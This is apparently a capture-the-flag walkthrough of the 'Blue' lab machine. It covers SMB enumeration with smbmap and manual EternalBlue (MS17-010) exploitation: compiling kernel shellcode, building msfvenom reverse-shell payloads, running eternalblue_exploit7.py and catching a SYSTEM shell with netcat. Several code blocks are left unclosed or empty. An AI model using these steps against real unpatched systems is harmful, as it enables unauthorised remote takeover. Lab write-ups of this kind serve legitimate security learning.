# Enumeration
---
## Machine Prep
I've set a shell variable of $ip to point to 10.10.10.4 to make my life a little easier:
```
ip=10.10.10.40
```

## NMAP
Fast NMAP Scan  
I am running this first in order to identify ALL open ports quickly - I will then run a more advanced scan, focusing on these specific ports, afterwards. I am trying to get into the habit of being more focused with my enumeration.

SMB seems to be a popular theme between all of our Windows Boxes!
We'll run with the assumption that this scan is accurate and will note that this box appears to be running:

## SMB
Continuing on with our SMB/SAMBA themed boxes. We'll run through some initial enumeration.  
SMBMap Doesn't produce any results (at this point I'm beginning to think that my syntax is incorrect, but this has worked elsewhere).
```
smbmap -H $ip                                                                                                            130 ⨯ 1 ⚙

```
I see what happened. I need to specify 'guest' (as noted in the nmap results):
```
smbmap -H $ip -u 'guest'                                                                                                     1 ⚙

I 'touch' SMB real quick with SMBClient to list out the shares:
```

I created a new file on my machine in the same directory entitled 'test.txt' and put some random text within. Navigated to Public\Documents and confirm that I have the ability to upload files here:
```

Well - looks like this machine is vulnerable to Eternal Blue - which we should have already figured out from the machine name, right? ;)

# Exploitation
## MS17-10 Attempt #2
Performed some searches for 'Eternal Blue Manual Exploitation' and stumbled upon this [Link](https://danielantonsen.com/ms17-010-eternalblue-manual-exploitation/). There's quite a bit of information here, so I'll have to break it down into parts.

Compiled the shell code for each as instructed:
```
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
```

Constructed appropriate MSFVenom payloads for each:
```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=10.10.14.12 --platform windows -a x64 --format raw -o sc_x64_payload.bin
```

```
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.10.14.12 --platform windows -a x86 --format raw -o sc_x86_payload.bin
```

We merge our binaries and payloads (for each architecture):
```
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
```
```
cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
```
And then we combine them (note that I had to specify python2):
```
python2 MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin   
```
We see from the article that we need to specify which exploit to run, based on the OS of the target machine (in our case,it is 7 for Windows 7)

![Blue1](images/Blue1.png)

Start up the netcat listener according to the port I specified in the payload (443) and ran exploit7 against the machine:
```
python2 MS17-010/eternalblue_exploit7.py 10.10.10.40 sc_all.bin                                       
shellcode size: 2203
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```
We see that the listener picked up on the other end, and we're automatically priv -esc'd to system:
```
listen 443          1 ⨯
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.40] 49158

Cat'd out user and root and the box is complete!

## MS17-10 Attempt #1
{: .warning }
Failed attempt

Looking through my notes, I do see that I've previously had success with this [Exploit](https://github.com/k4u5h41/MS17-010_CVE-2017-0143) from k4u4h41. So we'll start there.  
Cloned the respository down to my machine:
```
git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143
```
The instructions require that we generate an msfvenom payload with the specifics of the reverse shell (our IP and requested port). Put this one together:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.40 LPORT=1337 -f exe -o ms17-010.exe
```
Unfortunetly, no joy here.
```
